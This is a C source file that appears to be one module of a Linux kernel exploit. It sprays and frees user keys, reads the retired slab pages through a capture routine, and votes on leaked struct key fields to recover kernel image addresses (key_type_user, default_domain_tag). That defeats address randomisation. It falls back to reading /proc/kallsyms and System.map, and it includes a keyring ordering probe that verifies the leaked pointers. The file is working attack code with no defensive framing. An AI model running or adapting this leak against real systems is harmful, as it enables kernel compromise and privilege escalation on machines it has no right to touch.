#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/keyctl.h>
#include <linux/membarrier.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <unistd.h>

#include "leak.h"
#include "target_hardened.h"
#include "target_gen.h"

#define K2_LEAK_OBJECTS 160U
#define K2_VERIFY_KEYS 16U

typedef int32_t key_serial_t;

static long add_key_raw(const char *type, const char *desc,
                        const void *payload, size_t length, key_serial_t ring)
{
    return syscall(SYS_add_key, type, desc, payload, length, ring);
}

static long keyctl_raw(unsigned long cmd, unsigned long a2, unsigned long a3,
                       unsigned long a4, unsigned long a5)
{
    return syscall(SYS_keyctl, cmd, a2, a3, a4, a5);
}

static int global_rcu_gp(void)
{
    long rc = syscall(SYS_membarrier, MEMBARRIER_CMD_GLOBAL, 0, 0);

    return rc < 0 ? -errno : 0;
}

/* kmalloc() size class for a request, matching kmalloc_info[]. */
static size_t kmalloc_bucket(size_t request)
{
    static const size_t sizes[] = {
        8, 16, 32, 64, 96, 128, 192, 256, 512, 1024, 2048, 4096,
    };

    for (size_t i = 0; i < sizeof(sizes) / sizeof(sizes[0]); i++)
        if (request <= sizes[i])
            return sizes[i];
    return 8192;
}

static bool image_pointer(uint64_t value)
{
    return value >= UINT64_C(0xffffffff80000000) &&
           value < UINT64_C(0xffffffffc0000000) && (value & 7) == 0;
}

/*
 * A retired struct key page: key_type and domain_tag are static image
 * addresses and every object of our generation carries the same pair, so the
 * modal pair wins even where the SLUB freepointer overwrote a field.
 */
static int scan_key_page(const unsigned char *page, size_t length,
                         size_t stride, size_t count, uint64_t *type_out,
                         uint64_t *domain_out)
{
    uint64_t types[32], domains[32];
    unsigned int votes[32] = {0};
    unsigned int best = 0, index = 0;

    if (count > 32)
        count = 32;
    if (length < count * stride + k2l.key_domain + 8)
        return -EMSGSIZE;
    for (size_t slot = 0; slot < count; slot++) {
        const unsigned char *object = page + slot * stride;

        memcpy(&types[slot], object + k2l.key_type, sizeof(uint64_t));
        memcpy(&domains[slot], object + k2l.key_domain, sizeof(uint64_t));
        if (!image_pointer(types[slot]) || !image_pointer(domains[slot]))
            continue;
        for (size_t other = 0; other < count; other++)
            votes[slot] += types[other] == types[slot] &&
                           domains[other] == domains[slot];
        if (votes[slot] > best) {
            best = votes[slot];
            index = (unsigned int)slot;
        }
    }
    if (best < 2)
        return -ENOENT;
    *type_out = types[index];
    *domain_out = domains[index];
    return 0;
}

static int create_leak_ring(void)
{
    char description[64];
    long ring;

    snprintf(description, sizeof(description), "k2-leak-%ld", (long)getpid());
    ring = add_key_raw("keyring", description, NULL, 0,
                       KEY_SPEC_PROCESS_KEYRING);
    return ring < 0 ? -errno : (int)ring;
}

int k2_leak_key_pointers(k2_capture_fn capture, unsigned int attempts,
                         useconds_t delay, struct k2_key_pointers *out)
{
    size_t stride = kmalloc_bucket(k2l.key_size), count = 4096 / stride;
    size_t *targets = NULL;
    key_serial_t *serials = NULL;
    uint64_t tally_type[32] = {0}, tally_domain[32] = {0};
    unsigned int tally_votes[32] = {0}, best = 0, candidates = 0;
    unsigned char payload = 0x41;
    int ring = -1, rc;

    if (!capture || !out || k2l.key_size < 8 || count < 4)
        return -EINVAL;
    if (count > 32)
        count = 32;
    targets = calloc(count * 2, sizeof(*targets));
    serials = calloc(K2_LEAK_OBJECTS, sizeof(*serials));
    if (!targets || !serials) {
        rc = -ENOMEM;
        goto out;
    }
    for (size_t i = 0; i < count; i++) {
        targets[i * 2] = i * stride + k2l.key_type;
        targets[i * 2 + 1] = i * stride + k2l.key_domain;
    }
    ring = create_leak_ring();
    if (ring < 0) {
        rc = ring;
        goto out;
    }
    for (unsigned int i = 0; i < K2_LEAK_OBJECTS; i++) {
        char description[32];
        long serial;

        snprintf(description, sizeof(description), "kl%06x", i);
        serial = add_key_raw("user", description, &payload, 1,
                             (key_serial_t)ring);
        if (serial < 0) {
            rc = -errno;
            goto out;
        }
        serials[i] = (key_serial_t)serial;
    }
    /* Unlink, drop the last reference, then wait for key GC and a grace
     * period so the slabs actually retire. */
    (void)keyctl_raw(KEYCTL_CLEAR, (unsigned long)ring, 0, 0, 0);
    for (unsigned int i = 0; i < K2_LEAK_OBJECTS; i++)
        (void)keyctl_raw(KEYCTL_INVALIDATE, (unsigned long)serials[i], 0, 0, 0);
    rc = global_rcu_gp();
    if (rc)
        goto out;
    usleep(60000);
    rc = global_rcu_gp();
    if (rc)
        goto out;

    for (unsigned int attempt = 0; attempt < attempts; attempt++) {
        unsigned char *page = NULL;
        uint64_t type = 0, domain = 0;
        size_t length = 0;
        unsigned int slot;

        rc = capture(targets, count * 2, delay, &page, &length);
        if (rc) {
            if (rc == -ETIMEDOUT)
                continue;
            goto out;
        }
        rc = scan_key_page(page, length, stride, count, &type, &domain);
        free(page);
        if (rc)
            continue;
        candidates++;
        for (slot = 0; slot < 32; slot++) {
            if (!tally_votes[slot]) {
                tally_type[slot] = type;
                tally_domain[slot] = domain;
            } else if (tally_type[slot] != type ||
                       tally_domain[slot] != domain) {
                continue;
            }
            if (++tally_votes[slot] > best)
                best = tally_votes[slot];
            break;
        }
    }
    for (unsigned int slot = 0; slot < 32 && best; slot++) {
        if (tally_votes[slot] == best) {
            out->type = tally_type[slot];
            out->domain = tally_domain[slot];
            out->votes = best;
            break;
        }
    }
    if (!out->type) {
        rc = -ENOENT;
        goto out;
    }
    snprintf(out->source, sizeof(out->source), "key-slab");
    printf("K2_LEAK_KEY_POINTERS type=%#" PRIx64 " domain=%#" PRIx64
           " votes=%u pages=%u\n", out->type, out->domain, out->votes,
           candidates);
    rc = 0;
out:
    if (ring >= 0) {
        (void)keyctl_raw(KEYCTL_CLEAR, (unsigned long)ring, 0, 0, 0);
        (void)keyctl_raw(KEYCTL_REVOKE, (unsigned long)ring, 0, 0, 0);
        (void)keyctl_raw(KEYCTL_UNLINK, (unsigned long)ring,
                         (unsigned long)KEY_SPEC_PROCESS_KEYRING, 0, 0);
    }
    free(targets);
    free(serials);
    return rc;
}

static int parse_map_file(const char *path, struct k2_key_pointers *out)
{
    FILE *file = fopen(path, "r");
    char line[512];
    bool type = false, domain = false;

    if (!file)
        return -errno;
    while (fgets(line, sizeof(line), file)) {
        unsigned long long address;
        char name[256];
        char kind;

        if (sscanf(line, "%llx %c %255s", &address, &kind, name) < 3)
            continue;
        if (!address)
            continue;
        if (!image_pointer((uint64_t)address))
            continue;
        if (strcmp(name, "key_type_user") == 0) {
            out->type = (uint64_t)address;
            type = true;
        } else if (strcmp(name, "default_domain_tag") == 0) {
            out->domain = (uint64_t)address;
            domain = true;
        }
        if (type && domain)
            break;
    }
    fclose(file);
    if (!out->type || !out->domain)
        return -ENOENT;
    return 0;
}

int k2_symbol_key_pointers(struct k2_key_pointers *out)
{
    char path[256];
    struct utsname uts;
    int rc;

    if (!out)
        return -EINVAL;
    memset(out, 0, sizeof(*out));
    rc = parse_map_file("/proc/kallsyms", out);
    if (rc == 0) {
        snprintf(out->source, sizeof(out->source), "kallsyms");
        return 0;
    }
    if (uname(&uts) != 0)
        return -errno;
    snprintf(path, sizeof(path), "/boot/System.map-%s", uts.release);
    rc = parse_map_file(path, out);
    if (rc == 0) {
        snprintf(out->source, sizeof(out->source), "System.map");
        return 0;
    }
    return rc;
}

/*
 * Order probe.  Sixteen descriptions with distinct low hash nibbles land in a
 * single node, so KEYCTL_READ must return them in ascending slot order.  A
 * wrong key_type/domain pair or a drifted hash function scrambles that.
 */
int k2_verify_key_pointers(const struct k2_key_pointers *pointers)
{
    key_serial_t serials[K2_VERIFY_KEYS] = {0};
    key_serial_t values[K2_VERIFY_KEYS + 8];
    char descriptions[K2_VERIFY_KEYS][16];
    int ring = -1, rc = 0;
    long needed, got;

    if (!pointers || !pointers->type || !pointers->domain)
        return -EINVAL;
    for (unsigned int nibble = 0; nibble < K2_VERIFY_KEYS; nibble++) {
        bool found = false;

        for (uint32_t counter = 0; counter < (1U << 20) && !found; counter++) {
            char candidate[16];
            uint64_t hash;

            snprintf(candidate, sizeof(candidate), "v%06x", counter);
            hash = k2_key_hash(pointers->type, pointers->domain,
                               (const unsigned char *)candidate,
                               strlen(candidate), false);
            if ((hash & 0xfU) != nibble)
                continue;
            memcpy(descriptions[nibble], candidate, strlen(candidate) + 1);
            found = true;
        }
        if (!found)
            return -ENOENT;
    }
    ring = create_leak_ring();
    if (ring < 0)
        return ring;
    for (unsigned int i = 0; i < K2_VERIFY_KEYS; i++) {
        long serial = add_key_raw("user", descriptions[i], "x", 1,
                                  (key_serial_t)ring);

        if (serial < 0) {
            rc = -errno;
            goto out;
        }
        serials[i] = (key_serial_t)serial;
    }
    needed = keyctl_raw(KEYCTL_READ, (unsigned long)ring, 0, 0, 0);
    if (needed != (long)(K2_VERIFY_KEYS * sizeof(key_serial_t))) {
        rc = -EIO;
        goto out;
    }
    got = keyctl_raw(KEYCTL_READ, (unsigned long)ring, (unsigned long)values,
                     sizeof(values), 0);
    if (got != needed) {
        rc = -EIO;
        goto out;
    }
    for (unsigned int i = 0; i < K2_VERIFY_KEYS; i++) {
        if (values[i] != serials[i]) {
            rc = -EAGAIN;
            goto out;
        }
    }
out:
    if (ring >= 0) {
        (void)keyctl_raw(KEYCTL_CLEAR, (unsigned long)ring, 0, 0, 0);
        (void)keyctl_raw(KEYCTL_REVOKE, (unsigned long)ring, 0, 0, 0);
        (void)keyctl_raw(KEYCTL_UNLINK, (unsigned long)ring,
                         (unsigned long)KEY_SPEC_PROCESS_KEYRING, 0, 0);
    }
    printf("K2_VERIFY_KEY_POINTERS rc=%d\n", rc);
    return rc;
}
